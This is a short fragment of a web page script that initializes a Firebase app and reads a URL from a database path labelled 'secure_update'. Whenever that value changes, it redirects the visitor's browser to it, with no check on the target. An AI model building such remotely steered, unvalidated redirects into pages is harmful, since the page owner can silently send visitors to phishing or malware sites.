    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

    const firebaseConfig = {

      authDomain: "crad-8e69b.firebaseapp.com",
      databaseURL: "https://crad-8e69b-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "crad-8e69b",
      storageBucket: "crad-8e69b.firebasestorage.app",
      messagingSenderId: "529233840442",
      appId: "1:529233840442:web:3fb391862ee53e2cf7a803"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    // Read directly from secure_update/crad_secure_2025_pi/url
    const urlRef = ref(db, "secure_update/crad_secure_2025_pi/url");

    onValue(urlRef, (snapshot) => {
      const url = snapshot.val();
      if (url && typeof url === "string") {
        window.location.href = url;
      }
    }, (error) => {
      console.error("Firebase read error:", error);
    });
  </script>
</body>
